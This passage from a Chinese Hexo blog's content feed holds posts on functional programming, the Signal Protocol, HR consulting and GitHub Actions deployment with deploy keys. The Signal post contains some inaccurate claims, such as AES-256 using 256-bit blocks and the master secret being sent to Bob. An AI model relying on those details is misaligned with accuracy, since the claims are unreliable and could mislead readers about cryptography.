上发表的一篇文章中指出的那样，目标不是创建完全没有副作用的代码。</p><p>“了解我们不想消除所有副作用很重要，因为所有程序都需要执行某种副作用，例如调用 API 或打印到某些标准输出。我们想要的是尽量减少副作用，这样我们程序的行为就更容易预测和测试，”Cordova 说。</p><p>在 Cordova 编写的以下代码中，副作用 (sessionIsActive) 修改了其范围之外的变量。这会给函数调用者带来问题。</p><h3 id="一级函数"><a href="#一级函数" class="headerlink" title="一级函数"></a>一级函数</h3><p>first-class functions 的另一个关键好处是对函数的使用方式没有任何限制和限制。换句话说，它们的行为与任何其他变量一样。</p><p>一级函数为其他修改奠定了基础，例如柯里化、高阶函数和闭包。</p><h3 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h3><p>高阶函数将函数作为参数或返回函数。除了模块化程序之外，您还可以使用高阶函数使函数多态（即，允许多次使用单个代码）。</p><h3 id="不变性"><a href="#不变性" class="headerlink" title="不变性"></a>不变性</h3><p>不可变对象不会改变。在 FP 中，您可以在不更改它们的值或状态的情况下初始化和实现对象和值。如有必要，您可以创建新的对象和值，但不能修改现有对象或值的状态。</p><p>函数式编程的不变性符合数学的一个关键原则——对象不能改变它们的状态。即使在最基本的数学公式中，这一原则也很明显。</p><p>不变性可防止问题在您的代码中出现和传播。在多线程应用程序中，一个线程可以在不改变其他线程的情况下对不可变对象进行操作，因为没有人在修改该对象。在并发应用程序中，这可以防止代码中出现错误。</p><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>递归发生在函数调用自身时。递归函数执行代码并重复运行该函数，直到它满足退出条件。您可以在标准循环中找到此模式：循环声明一个初始变量并执行要使用该变量完成的代码。这一直持续到它满足停止或退出条件。</p><p>您可以使用递归而不是循环。但是，循环永远不能代替递归。</p><p>在对树结构（即节点关系）进行排序时，递归通常可以正确完成工作。<br>如果您发现自己反复在循环中嵌套循环，递归函数可以帮助您提取数据并将该函数重复用于不同的树。</p><h3 id="功能组合"><a href="#功能组合" class="headerlink" title="功能组合"></a>功能组合</h3><p>函数组合允许您组合纯函数来创建更复杂的函数。同样的原则也适用于数学：一个函数的结果继续作为下一个函数的参数，最后一个函数的结果是整体的结果。</p><p>在编码中，我们可以将多个步骤合并到一个代码行或一个新函数中。</p><h3 id="参考透明度"><a href="#参考透明度" class="headerlink" title="参考透明度"></a>参考透明度</h3><p>引用透明性允许一个值替换它在程序中的表达式（或任何具有相同值的东西）。这在不改变程序结果的情况下发生。此逻辑规定方法应始终为给定参数返回相同的值，而不会产生额外的影响。</p><p>引用透明性使程序推理成为一个更直接的过程。它使每个子程序独立，从而极大地简化了重构和单元测试。</p><h2 id="面向对象编程与函数式编程"><a href="#面向对象编程与函数式编程" class="headerlink" title="面向对象编程与函数式编程"></a>面向对象编程与函数式编程</h2><p>虽然面向对象编程和函数式编程之间存在几个关键区别，但其中一个是 <code>命令式编程模型</code> 与 <code>声明式编程模型</code>。</p><p>OOP 使用命令式编程模型，这意味着函数总是在解决问题所需的每个步骤中进行编码。您使用指定如何解决问题的代码本身对每个操作进行编码。该模型要求程序员知道解决问题需要哪些函数，而不是依赖可以解决问题的模型。</p><p>FP 使用声明式编程模型，这意味着它依赖于编程语言的基本概念来执行必要的步骤以达到预定的结果。</p><blockquote><p>命令式程序关注解决问题的逐步过程，而声明式程序关注解决问题的结果。</p></blockquote><p>另一个关键区别是可变性：OOP 使用可变数据，而 FP 使用不可变数据。您可以在创建后更改（或变异）可变对象，而不能用于不可变对象。在 FP 中，您需要制作对象的副本并使用该副本来编写其余代码。</p><p>总体而言，不可变代码更易于更新、更有效地管理以及更易于测试和调试。而且由于变量是常量，因此生成的代码更容易理解和推理。许多程序员和软件开发人员更喜欢使用 FP 模型。</p><p>OOP 最适合标准化和直接的项目，而 FP 最适合需要可扩展性和灵活性的项目。</p><h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><ul><li><a href="https://www.codingdojo.com/blog/what-is-functional-programming">what-is-functional-programming</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 函数式编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Signal Protocol概括</title>
      <link href="/2023/04/07/crypto/Signal%20Protocol%E6%A6%82%E6%8B%AC/"/>
      <url>/2023/04/07/crypto/Signal%20Protocol%E6%A6%82%E6%8B%AC/</url>
      
        <content type="html"><![CDATA[<p>在消息服务中实施端到端加密意味着任何给定消息的内容仅对您（发件人）和您的朋友（预期收件人）可用。如果没有 E2EE，您的消息在传输到服务器时可能会被加密，但服务器可能能够读取它。例如，某些服务提供商可能会这样做以生成更针对用户的广告。</p><p>使用 E2EE，您的消息在通过任何可能的中介时始终处于加密状态。除了预期的收件人之外，没有人拥有解密它的密钥。有了良好的 E2EE 协议，中介（消息应用程序服务器、数据库）和任何有恶意的人都无法读取您发送的消息。</p><p>由于我们可能通过文本&#x2F;即时消息共享大量敏感信息，这正成为一个重要问题。Signal 是 Open Whisper Systems (OWS) 开发的消息传递应用程序，每天都在世界各地的人们中越来越受欢迎，因为它为其顾客提供端到端加密。它使用同样由 OWS 开发的开源端到端加密协议 Signal Protocol。</p><h2 id="怎么运行的！"><a href="#怎么运行的！" class="headerlink" title="怎么运行的！"></a>怎么运行的！</h2><h3 id="使用-Signal-协议生成密钥和注册"><a href="#使用-Signal-协议生成密钥和注册" class="headerlink" title="使用 Signal 协议生成密钥和注册"></a>使用 Signal 协议生成密钥和注册</h3><p>使用 Open Whisper System 的信号协议在两个用户之间建立端到端加密连接的第一步是生成一组长期身份密钥对、中期签名预密钥对和几个临时预密钥对。这些密钥在客户端生成并存储在本地安全的地方。第二步涉及将所有公钥和注册 ID 打包到一个对象（称为“密钥包”）中，并将其注册到密钥分发中心。为了让 Alice 向 Bob 发送消息，Alice 必须知道并有权访问 Bob 的注册 ID 和公钥以启动会话。因此，Alice 必须首先生成她自己的密钥并在密钥分发中心注册自己并请求 Bob 的密钥包。</p><h3 id="开始会话"><a href="#开始会话" class="headerlink" title="开始会话"></a>开始会话</h3><p>一旦 Alice 从密钥分发中收到 Bob 的密钥包，她就会使用自己的身份和中期私钥以及 Bob 的私钥集来计算主共享秘密。然后使用此主密钥启动与 Bob 的会话。一旦爱丽丝计算出主共享秘密，她就会将其发送给鲍勃，以便他可以破译并验证它。在 Bob 的机器上验证主共享秘密后，两个用户中的任何一个都可以开始互相发送消息。</p><h3 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h3><p>建立会话后，Alice 就可以开始向 Bob 发送消息。此过程在很大程度上依赖于 X3DH 密钥协议，并且使 Signal Protocol 能够提供前向保密和密码拒绝能力。这还有一个额外的好处，即异步性，因此可以在离线时发送消息。当会话处于活动状态时，Alice 使用主共享密钥和 Bob 的临时密钥加密消息并将其发送给 Bob。此步骤创建根密钥、相应的链密钥和消息链。这些对于维护前向保密和隐私至关重要。因此，发送的每条消息都会导致创建一组新的一次性会话（临时）密钥，然后使用这些密钥来加密&#x2F;解密任何未来的消息。</p><h2 id="算法说明"><a href="#算法说明" class="headerlink" title="算法说明"></a>算法说明</h2><p>在更高的层次上，Signal Protocol 是一个强大的安全库。尽管它具有新颖性和日益重要的意义，但很少有人对该协议进行正式分析，尽管它一直是网络安全领域的推动力。那么，是什么让它如此强大？</p><p>信号协议合并了扩展三重 Diffie-Hellman (X3DH) 密钥协商协议、双棘轮算法、预密钥，并使用 Curve25519、AES-256 和 HMAC-SHA256 作为加密原语。这些都是成熟的低级密码算法，经常用于构建计算机安全系统。</p><p>让我们进一步分解，以便我们能够了解这些算法中的每一个所扮演的角色：</p><h3 id="X3DH（密钥协商协议）"><a href="#X3DH（密钥协商协议）" class="headerlink" title="X3DH（密钥协商协议）"></a>X3DH（密钥协商协议）</h3><p>这通过在两方之间生成所有必要的密钥来进行通信来拉开序幕。它在相互认证的双方基于他们的公钥对建立关键的共享密钥。X3DH 还允许在一方“离线”的情况下进行密钥交换，而是通过第三方服务器进行交换。</p><p>X3DH 涉及 3 个主要参与方：</p><ul><li>Alice</li><li>Bob</li><li>Server</li></ul><p>X3DH 有 3 个阶段：</p><ul><li>Bob 将他的身份密钥和预密钥注册到服务器</li><li>Alice 从服务器检索 Bob 的“prekey bundle”——用它来启动会话并向 Bob 发送初始消息</li><li>Bob 收到并解密 Alice 的消息</li></ul><p><img src="/assets/images/X3DH.png"></p><h3 id="双棘轮算法（密钥管理算法）"><a href="#双棘轮算法（密钥管理算法）" class="headerlink" title="双棘轮算法（密钥管理算法）"></a>双棘轮算法（密钥管理算法）</h3><p>这被用作加密协议的一部分，以提供基于从 X3DH 派生的共享密钥的 E2EE。一旦双方通过 X3DH 就共享密钥达成一致，双方就可以使用双棘轮算法发送和接收加密消息。</p><p><img src="/assets/images/double-ratchet.png"></p><h3 id="密钥派生链-KDF"><a href="#密钥派生链-KDF" class="headerlink" title="密钥派生链 (KDF)"></a>密钥派生链 (KDF)</h3><p>X3DH 的密钥交换输出一个主密钥，后者又用于派生两个对称密钥：“根密钥”和“发送链密钥”。随着消息的发送和接收，这些附加到消息的密钥通过 KDF 不断变化。当 Alice 为 Bob 加密她的消息时，她将她的发送链向前推进了一步，派生出一个替换发送链密钥以及一个消息加密密钥。当她收到来自 Bob 的消息时，她推进她的接收链以生成解密密钥。根链在会话初始化时被推进，生成一个临时密钥（“棘轮密钥”）。然后她将其附加到她的消息中，这样每条消息都带有一个不断变化的临时密钥，从而使第三方窥探者无法解密以前和未来的消息。</p><h3 id="Curve25519"><a href="#Curve25519" class="headerlink" title="Curve25519"></a>Curve25519</h3><p>给定 Bob 的 32 字节私钥，Curve25519 生成他的 32 字节公钥。给定 Bob 的 32 字节私钥和 Alice 的 32 字节公钥，Curve25519 生成双方共享的主密钥。该秘密随后用于验证和开始加密它们之间的消息。该算法经过精心设计，允许所有 32 字节的字符串作为 Diffie-Hellman 公钥。Signal 协议利用 Curve25519 进行所有非对称加密操作。</p><h3 id="AES-256（高级加密标准）"><a href="#AES-256（高级加密标准）" class="headerlink" title="AES-256（高级加密标准）"></a>AES-256（高级加密标准）</h3><p>这是一种对称块密码，用于保护和加密敏感数据。此密码以 256 位的块为单位加密和解密数据。对称密码使用相同的密钥来加密和解密数据，因此 Bob 和 Alice 必须都知道并使用相同的密钥。总共有 14 轮 256 位密钥——一轮由几个处理步骤组成，包括替换、转置和随机混合明文（加密前）以输出密文（加密文本）。</p><h3 id="HMAC-SHA256（基于哈希的消息认证码）"><a href="#HMAC-SHA256（基于哈希的消息认证码）" class="headerlink" title="HMAC-SHA256（基于哈希的消息认证码）"></a>HMAC-SHA256（基于哈希的消息认证码）</h3><p>这是一种特定类型的消息验证代码，涉及加密哈希函数和秘密加密密钥。它还验证数据完整性以及消息的身份验证。这种类型的键控哈希算法是从 SHA-256 哈希函数构建的。该算法将主密钥与消息数据混合，用哈希函数对结果进行哈希处理，然后再次将该哈希值与密钥混合，最后再次调用哈希函数。输出散列的长度为 256 位。</p><h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><ul><li><a href="https://medium.com/@justinomora/demystifying-the-signal-protocol-for-end-to-end-encryption-e2ee-ad6a567e6cb4">demystifying-the-signal-protocol</a></li><li><a href="https://signal.org/docs/specifications/x3dh/">signal-specifications-x3dh</a></li><li><a href="https://signal.org/docs/specifications/doubleratchet/">signal-specifications-doubleratchet</a></li><li><a href="https://signal.org/docs/specifications/sesame/">signal-specifications-sesame</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Signal Protocol </tag>
            
            <tag> E2EE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人力资源管理咨询体系</title>
      <link href="/2023/04/06/%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%92%A8%E8%AF%A2%E4%BD%93%E7%B3%BB/"/>
      <url>/2023/04/06/%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%92%A8%E8%AF%A2%E4%BD%93%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[<p>作者</p><h2 id="宏观服务体系"><a href="#宏观服务体系" class="headerlink" title="宏观服务体系"></a>宏观服务体系</h2><p>一套完整的人力资源管理咨询服务体系，包括以下几个大方面：</p><ol><li><p>人力资源规划咨询：根据企业的战略发展规划，对企业未来的人力资源需求进行分析和预测，制定人力资源规划方案。</p></li><li><p>绩效管理咨询：对企业的绩效管理制度进行评估和改进，建立科学、公正、有效的绩效考核体系，提高员工的工作绩效和企业的绩效水平。</p></li><li><p>薪酬管理咨询：设计和优化企业的薪酬管理制度，制定公正、合理、激励性的薪酬政策，提高员工的薪酬福利待遇和企业的竞争力。</p></li><li><p>培训与发展咨询：根据企业的战略发展规划和员工的职业发展需求，制定培训计划和发展方案，提高员工的职业素质和企业的人才储备。</p></li><li><p>组织变革咨询：对企业的组织结构、流程和文化进行评估和改进，帮助企业实现组织变革和转型，提高企业的适应性和竞争力。</p></li><li><p>人力资源信息化咨询：根据企业的信息化发展需求，设计和实施人力资源信息化系统，提高人力资源管理的效率和精度。</p></li></ol><h2 id="微观落地细则"><a href="#微观落地细则" class="headerlink" title="微观落地细则"></a>微观落地细则</h2><p><img src="/./../assets/images/%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%92%A8%E8%AF%A2%E4%BD%93%E7%B3%BB.png"></p>]]></content>
      
      
      <categories>
          
          <category> Human Resource Management </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Human Resource </tag>
            
            <tag> Consulting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo + GitHub Actions 实现博文自动部属</title>
      <link href="/2023/04/05/Hexo%20+%20GitHub%20Actions%20%E5%AE%9E%E7%8E%B0%E5%8D%9A%E6%96%87%E8%87%AA%E5%8A%A8%E9%83%A8%E5%B1%9E/"/>
      <url>/2023/04/05/Hexo%20+%20GitHub%20Actions%20%E5%AE%9E%E7%8E%B0%E5%8D%9A%E6%96%87%E8%87%AA%E5%8A%A8%E9%83%A8%E5%B1%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h2><img class="kroki" src='data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaGVpZ2h0PSIyNDlweCIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSIgc3R5bGU9IndpZHRoOjYxMnB4O2hlaWdodDoyNDlweDtiYWNrZ3JvdW5kOiNGRkZGRkY7IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA2MTIgMjQ5IiB3aWR0aD0iNjEycHgiIHpvb21BbmRQYW49Im1hZ25pZnkiPjxkZWZzLz48Zz48bGluZSBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTtzdHJva2UtZGFzaGFycmF5OjUuMCw1LjA7IiB4MT0iMjIiIHgyPSIyMiIgeTE9IjM2LjI5NjkiIHkyPSIyMTMuOTYwOSIvPjxsaW5lIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MC41O3N0cm9rZS1kYXNoYXJyYXk6NS4wLDUuMDsiIHgxPSIxODcuNSIgeDI9IjE4Ny41IiB5MT0iMzYuMjk2OSIgeTI9IjIxMy45NjA5Ii8+PGxpbmUgc3R5bGU9InN0cm9rZTojMTgxODE4O3N0cm9rZS13aWR0aDowLjU7c3Ryb2tlLWRhc2hhcnJheTo1LjAsNS4wOyIgeDE9IjM2Mi41IiB4Mj0iMzYyLjUiIHkxPSIzNi4yOTY5IiB5Mj0iMjEzLjk2MDkiLz48cmVjdCBmaWxsPSIjRTJFMkYwIiBoZWlnaHQ9IjMwLjI5NjkiIHJ4PSIyLjUiIHJ5PSIyLjUiIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MC41OyIgd2lkdGg9IjM1IiB4PSI1IiB5PSI1Ii8+PHRleHQgZmlsbD0iIzAwMDAwMCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTQiIGxlbmd0aEFkanVzdD0ic3BhY2luZyIgdGV4dExlbmd0aD0iMjEiIHg9IjEyIiB5PSIyNC45OTUxIj5NZTwvdGV4dD48cmVjdCBmaWxsPSIjRTJFMkYwIiBoZWlnaHQ9IjMwLjI5NjkiIHJ4PSIyLjUiIHJ5PSIyLjUiIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MC41OyIgd2lkdGg9IjM1IiB4PSI1IiB5PSIyMTIuOTYwOSIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjE0IiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9IjIxIiB4PSIxMiIgeT0iMjMyLjk1NjEiPk1lPC90ZXh0PjxyZWN0IGZpbGw9IiNFMkUyRjAiIGhlaWdodD0iMzAuMjk2OSIgcng9IjIuNSIgcnk9IjIuNSIgc3R5bGU9InN0cm9rZTojMTgxODE4O3N0cm9rZS13aWR0aDowLjU7IiB3aWR0aD0iOTgiIHg9IjEzOC41IiB5PSI1Ii8+PHRleHQgZmlsbD0iIzAwMDAwMCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTQiIGxlbmd0aEFkanVzdD0ic3BhY2luZyIgdGV4dExlbmd0aD0iODQiIHg9IjE0NS41IiB5PSIyNC45OTUxIj5CbG9nIFNvdXJjZTwvdGV4dD48cmVjdCBmaWxsPSIjRTJFMkYwIiBoZWlnaHQ9IjMwLjI5NjkiIHJ4PSIyLjUiIHJ5PSIyLjUiIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MC41OyIgd2lkdGg9Ijk4IiB4PSIxMzguNSIgeT0iMjEyLjk2MDkiLz48dGV4dCBmaWxsPSIjMDAwMDAwIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSIxNCIgbGVuZ3RoQWRqdXN0PSJzcGFjaW5nIiB0ZXh0TGVuZ3RoPSI4NCIgeD0iMTQ1LjUiIHk9IjIzMi45NTYxIj5CbG9nIFNvdXJjZTwvdGV4dD48cmVjdCBmaWxsPSIjRTJFMkYwIiBoZWlnaHQ9IjMwLjI5NjkiIHJ4PSIyLjUiIHJ5PSIyLjUiIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MC41OyIgd2lkdGg9IjE1MiIgeD0iMjg2LjUiIHk9IjUiLz48dGV4dCBmaWxsPSIjMDAwMDAwIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSIxNCIgbGVuZ3RoQWRqdXN0PSJzcGFjaW5nIiB0ZXh0TGVuZ3RoPSIxMzgiIHg9IjI5My41IiB5PSIyNC45OTUxIj5HaXRodWIgUGFnZSBTb3VyY2U8L3RleHQ+PHJlY3QgZmlsbD0iI0UyRTJGMCIgaGVpZ2h0PSIzMC4yOTY5IiByeD0iMi41IiByeT0iMi41IiBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTsiIHdpZHRoPSIxNTIiIHg9IjI4Ni41IiB5PSIyMTIuOTYwOSIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjE0IiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9IjEzOCIgeD0iMjkzLjUiIHk9IjIzMi45NTYxIj5HaXRodWIgUGFnZSBTb3VyY2U8L3RleHQ+PHBvbHlnb24gZmlsbD0iIzE4MTgxOCIgcG9pbnRzPSIxNzUuNSw2My40Mjk3LDE4NS41LDY3LjQyOTcsMTc1LjUsNzEuNDI5NywxNzkuNSw2Ny40Mjk3IiBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjEuMDsiLz48bGluZSBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjEuMDsiIHgxPSIyMi41IiB4Mj0iMTgxLjUiIHkxPSI2Ny40Mjk3IiB5Mj0iNjcuNDI5NyIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjEzIiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9IjE0MSIgeD0iMjkuNSIgeT0iNjIuMzYzOCI+cHVzaCBvcmlnaW5hbCBibG9nIGZpbGVzPC90ZXh0PjxsaW5lIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MS4wO3N0cm9rZS1kYXNoYXJyYXk6Mi4wLDIuMDsiIHgxPSIxODcuNSIgeDI9IjIyOS41IiB5MT0iMTExLjY5NTMiIHkyPSIxMTEuNjk1MyIvPjxsaW5lIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MS4wO3N0cm9rZS1kYXNoYXJyYXk6Mi4wLDIuMDsiIHgxPSIyMjkuNSIgeDI9IjIyOS41IiB5MT0iMTExLjY5NTMiIHkyPSIxMjQuNjk1MyIvPjxsaW5lIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MS4wO3N0cm9rZS1kYXNoYXJyYXk6Mi4wLDIuMDsiIHgxPSIxODguNSIgeDI9IjIyOS41IiB5MT0iMTI0LjY5NTMiIHkyPSIxMjQuNjk1MyIvPjxwb2x5Z29uIGZpbGw9IiMxODE4MTgiIHBvaW50cz0iMTk4LjUsMTIwLjY5NTMsMTg4LjUsMTI0LjY5NTMsMTk4LjUsMTI4LjY5NTMsMTk0LjUsMTI0LjY5NTMiIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MS4wOyIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjEzIiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9Ijg2IiB4PSIxOTQuNSIgeT0iOTEuNDk2NiI+R2l0aHViIEFjdGlvbjwvdGV4dD48dGV4dCBmaWxsPSIjMDAwMDAwIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSIxMyIgbGVuZ3RoQWRqdXN0PSJzcGFjaW5nIiB0ZXh0TGVuZ3RoPSIxNjEiIHg9IjE5NC41IiB5PSIxMDYuNjI5NCI+Z2VuZXJhdGUgcHVibGljIGh0bWwgZmlsZXM8L3RleHQ+PHBvbHlnb24gZmlsbD0iIzE4MTgxOCIgcG9pbnRzPSIzNTAuNSwxNDkuODI4MSwzNjAuNSwxNTMuODI4MSwzNTAuNSwxNTcuODI4MSwzNTQuNSwxNTMuODI4MSIgc3R5bGU9InN0cm9rZTojMTgxODE4O3N0cm9rZS13aWR0aDoxLjA7Ii8+PGxpbmUgc3R5bGU9InN0cm9rZTojMTgxODE4O3N0cm9rZS13aWR0aDoxLjA7IiB4MT0iMTg3LjUiIHgyPSIzNTYuNSIgeTE9IjE1My44MjgxIiB5Mj0iMTUzLjgyODEiLz48dGV4dCBmaWxsPSIjMDAwMDAwIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSIxMyIgbGVuZ3RoQWRqdXN0PSJzcGFjaW5nIiB0ZXh0TGVuZ3RoPSI5OSIgeD0iMTk0LjUiIHk9IjE0OC43NjIyIj5zeW5jIHB1YmxpYyBmaWxlczwvdGV4dD48bGluZSBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjEuMDtzdHJva2UtZGFzaGFycmF5OjIuMCwyLjA7IiB4MT0iMzYyLjUiIHgyPSI0MDQuNSIgeTE9IjE4Mi45NjA5IiB5Mj0iMTgyLjk2MDkiLz48bGluZSBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjEuMDtzdHJva2UtZGFzaGFycmF5OjIuMCwyLjA7IiB4MT0iNDA0LjUiIHgyPSI0MDQuNSIgeTE9IjE4Mi45NjA5IiB5Mj0iMTk1Ljk2MDkiLz48bGluZSBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjEuMDtzdHJva2UtZGFzaGFycmF5OjIuMCwyLjA7IiB4MT0iMzYzLjUiIHgyPSI0MDQuNSIgeTE9IjE5NS45NjA5IiB5Mj0iMTk1Ljk2MDkiLz48cG9seWdvbiBmaWxsPSIjMTgxODE4IiBwb2ludHM9IjM3My41LDE5MS45NjA5LDM2My41LDE5NS45NjA5LDM3My41LDE5OS45NjA5LDM2OS41LDE5NS45NjA5IiBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjEuMDsiLz48dGV4dCBmaWxsPSIjMDAwMDAwIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSIxMyIgbGVuZ3RoQWRqdXN0PSJzcGFjaW5nIiB0ZXh0TGVuZ3RoPSIyMzYiIHg9IjM2OS41IiB5PSIxNzcuODk1Ij5HaXRodWIgQWN0aW9uIFxwdWJsaXNoIHRvIGdpdGh1YiBwYWdlPC90ZXh0PjwhLS1TUkM9W1JPLXoyVzhuNDhIeGRzQXVfYngwR2ozNklYMWlSUEFtOVdqaHppWEZ1VGpWejR2NEpKdHBWU29TMkVDRW1xN0t1dzhyRUhnc2M2ZUVxQ0lVZW43T1B0UFplUnB2d2M3eTl1elNHaE5Pa3k4UVNPc1U4WUxKZzJjamk0Q2VULWN4Y2NnNXB5UkpudldWcVJ0ZjVVcHFiWXJUbVMtYWJ3aFRBbWdfOTVFaHBtMDBdLS0+PC9nPjwvc3ZnPg=='><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><h3 id="准备-Deploy-key"><a href="#准备-Deploy-key" class="headerlink" title="准备 Deploy key"></a>准备 Deploy key</h3><p>要准备 Deploy key 就要用 ssh-keygen 生成公钥私钥</p><p><code>ssh-keygen -t ed25519 -C &quot;&lt;YOUR_EMAIL&gt;&quot; -f id_rsa</code></p><p><YOUR_EMAIL>可以替换成你的 GitHub Email 或者照下面填写 GitHub Action Bot 的 Email。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -C &quot;41898282+github-actions[bot]@users.noreply.github.com&quot; -f id_rsa</span><br></pre></td></tr></table></figure><p>Enter passphrase 就直接按下 Enter 跳过。<br>之后就会生成 id_rsa.pub 跟 id_rsa 两个文件。</p><ul><li>id_rsa.pub 是公钥</li><li>id_rsa 是私钥</li></ul><h3 id="GitHub-Pages-专案中放上公钥"><a href="#GitHub-Pages-专案中放上公钥" class="headerlink" title="GitHub Pages 专案中放上公钥"></a>GitHub Pages 专案中放上公钥</h3><p>点到要部属的 GitHub Pages 的 Repo<br><code>Setting -&gt; Deploy keys -&gt; Add deploy key</code></p><p>将 deploy.pub 公钥内容贴到 Key 这里。</p><p><strong>Allow write access 打勾，这样才能给 GitHub Actions 部属。</strong><br><img src="/../assets/images/hexo-github-add-deploy-key.png"></p><h3 id="Hexo-Source-专案中放上私钥"><a href="#Hexo-Source-专案中放上私钥" class="headerlink" title="Hexo Source 专案中放上私钥"></a>Hexo Source 专案中放上私钥</h3><p>点到放 Hexo Source 的 Repo</p><p><code>Setting -&gt; Secrets -&gt; Actions -&gt; New repository secret</code></p><ul><li>Name：DEPLOY_KEY</li><li>Value：将 deploy 私钥内容贴到这里。</li></ul><p><img src="/../assets/images/hexo-github-add-secrets.png"></p><h3 id="设定-GitHub-Actions"><a href="#设定-GitHub-Actions" class="headerlink" title="设定 GitHub Actions"></a>设定 GitHub Actions</h3><p>点到放 Hexo Source 的 Repo<br>按下 Actions 里面 set up a workflow yourself</p><p><img src="/../assets/images/github-action.png"></p><h2 id="创建-github-x2F-workflows-x2F-deploy-pages-yml"><a href="#创建-github-x2F-workflows-x2F-deploy-pages-yml" class="headerlink" title="创建 .github&#x2F;workflows&#x2F;deploy-pages.yml"></a>创建 .github&#x2F;workflows&#x2F;deploy-pages.yml</h2><p><img src="/../assets/images/hexo-github-workflows.png"></p><h3 id="特别注意"><a href="#特别注意" class="headerlink" title="特别注意"></a>特别注意</h3><ul><li>yml 里 <code>DEPLOY_KEY</code> 要和私钥部分一致，否则无法部署会 GitHub Page 仓库</li><li>yml 里 <code>Clone Themes</code> 要和代码内使用的主题一致，否则生成的文件将会全部是空文件</li></ul><h3 id="deploy-pages-yml-样例文件"><a href="#deploy-pages-yml-样例文件" class="headerlink" title="deploy-pages.yml 样例文件"></a>deploy-pages.yml 样例文件</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 